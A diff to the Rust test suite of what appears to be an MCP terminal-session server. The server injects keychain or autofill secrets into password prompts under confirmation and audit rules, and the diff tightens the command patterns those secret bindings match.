         let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
 
         for pass in 1..=12 {
@@ -3719,7 +3971,7 @@ mod tests {
     #[tokio::test]
     async fn the_callers_timeout_bounds_the_approval_and_the_prompt_together() {
         let mut sc = Scratch::new("endtoend");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let clock = Clock::manual(std::time::Instant::now());
         let server = server_full(
             keychain_mode(vec![b.clone()]),
@@ -3787,8 +4039,8 @@ mod tests {
     #[tokio::test]
     async fn a_session_exit_supersedes_a_pending_approval() {
         let mut sc = Scratch::new("supersede");
-        let dead_b = confirming(&mut sc, "killed", "^ssh\\b");
-        let live_b = confirming(&mut sc, "alive", "^psql\\b");
+        let dead_b = confirming(&mut sc, "killed", SSH_PROD);
+        let live_b = confirming(&mut sc, "alive", "^psql\\s+-h\\s+prod$");
         let server = server_with(
             keychain_mode(vec![dead_b.clone(), live_b.clone()]),
             &sc.audit_log(),
@@ -3980,8 +4232,8 @@ mod tests {
     #[tokio::test]
     async fn autofill_is_off_by_default() {
         let mut sc = Scratch::new("offbydefault");
-        let off_binding = sc.binding("off", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
-        let on_binding = sc.binding("on", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let off_binding = sc.binding("off", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
+        let on_binding = sc.binding("on", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
 
         // `both`, which §5.2 says lets step 1 run — so the mode is not
         // what stops this.
@@ -4056,7 +4308,7 @@ mod tests {
     #[tokio::test]
     async fn autofill_injects_when_it_is_enabled() {
         let mut sc = Scratch::new("enabled");
-        let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let mut sec = autofill_mode(vec![b], true);
         sec.secret_provider = "both".to_string();
         let server = server_with(sec, &sc.audit_log());
@@ -4120,7 +4372,7 @@ mod tests {
     #[tokio::test]
     async fn autofill_writes_binding_resolved_and_no_tool_audit_lines() {
         let mut sc = Scratch::new("autofillaudit");
-        let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
 
         let gate = sc.path("gate");
@@ -4255,7 +4507,7 @@ mod tests {
     #[tokio::test]
     async fn autofill_with_require_confirm_still_asks() {
         let mut sc = Scratch::new("autofillconfirm");
-        let b = confirming(&mut sc, "prod-ssh", "^ssh\\b");
+        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
         let server = server_full(
             autofill_mode(vec![b], true),
             &sc.audit_log(),
@@ -4438,7 +4690,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -4521,7 +4773,7 @@ mod tests {
         // ---- the pairing: the child stays at its echo-off read, and the
         // autofill does write
         let mut sc2 = Scratch::new("movedon-control");
-        let b2 = sc2.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b2 = sc2.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let server2 = server_with(autofill_mode(vec![b2], true), &sc2.audit_log());
         let gate2 = sc2.path("gate");
         let s2 = session_running("ssh", &["prod-01"], &gated_echo_off(&gate2));
@@ -4564,7 +4816,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -4643,7 +4895,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -4726,7 +4978,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -4819,7 +5071,7 @@ mod tests {
     #[tokio::test]
     async fn a_getpass_the_classifier_calls_fullscreen_is_still_answered() {
         let mut sc = Scratch::new("altscreen");
-        let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
         let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
         // The alternate screen, then GC14's fixture verbatim.
         let child = format!("printf '\\033[?1049h'; {ECHO_OFF_FIXTURE}");
@@ -4989,7 +5241,7 @@ mod tests {
         let gate = sc.path("gate");
         let b = sc.binding(
             "prod-ssh",
-            "^ssh\\b",
+            SSH_PROD,
             &format!(
                 "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                 gate.display()
@@ -5048,7 +5300,7 @@ mod tests {
         for pass in 0..PASSES {
             let mut sc = Scratch::new(&format!("sameedge-race-{pass}"));
             let child_gate = sc.path("child.gate");
-            let b = sc.binding("prod-ssh", "^ssh\\b", &format!("printf '{PROBE}\\n'\n"));
+            let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
             let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
             let s = session_running("ssh", &["prod-01"], &gated_echo_off(&child_gate));
             server.registry.insert(Arc::clone(&s)).expect("register");
@@ -5125,14 +5377,26 @@ mod tests {
     #[tokio::test]
     async fn start_session_arms_the_echo_drop_watcher() {
         let mut sc = Scratch::new("startsession");
-        let b = sc.binding("shell", "^sh\\b", &format!("printf '{PROBE}\\n'\n"));
+        // This row's session is `sh -c <script>` rather than an `ssh`, so
+        // its whole-line pattern is built from the script the row is about
+        // to run — `regex::escape`d, because the script is a shell one-liner
+        // full of regex metacharacters and a temporary path. The
+        // alternative spelling, `^sh\s+-c\s+.*$`, is the permissive tail
+        // `Config::validate` refuses in an operator's config; see
+        // [`SSH_PROD`].
+        let gate = sc.path("gate");
+        let script = gated_echo_off(&gate);
+        let b = sc.binding(
+            "shell",
+            &format!("^sh\\s+-c\\s+{}$", regex::escape(&script)),
+            &format!("printf '{PROBE}\\n'\n"),
+        );
         let server = server_with(autofill_mode(vec![b], true), &sc.audit_log());
 
-        let gate = sc.path("gate");
         let started = server
             .start_session(Parameters(crate::mcp::tools::StartSessionArgs {
                 command: "sh".into(),
-                args: vec!["-c".into(), gated_echo_off(&gate)],
+                args: vec!["-c".into(), script.clone()],
                 ..Default::default()
             }))
             .await
